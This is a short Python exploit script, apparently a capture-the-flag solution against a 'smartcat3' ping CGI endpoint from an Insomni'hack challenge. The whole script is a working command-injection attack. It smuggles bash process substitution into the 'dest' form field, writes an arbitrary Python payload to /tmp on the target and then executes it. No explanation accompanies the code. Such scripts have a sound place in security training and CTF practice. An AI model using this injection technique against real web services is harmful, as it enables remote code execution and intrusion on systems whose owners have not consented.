import requests

def send(s):
    return requests.post("http://smartcat3.insomni.hack/cgi-bin/ping.cgi", data={"dest":s}).text

def send_payload(pay):
    p="127.0.0.1<(python<<<\"print'"
    p+="%c"*len(pay)
    p+="'%("
    for c in pay:
        p+=str(ord(c))+","
    p=p[:-1]+")\">/tmp/p4Rocks)"
    send(p)
    p="127.0.0.1<(python</tmp/p4Rocks)"
    send(p)


send_payload(open("payload.py").read())
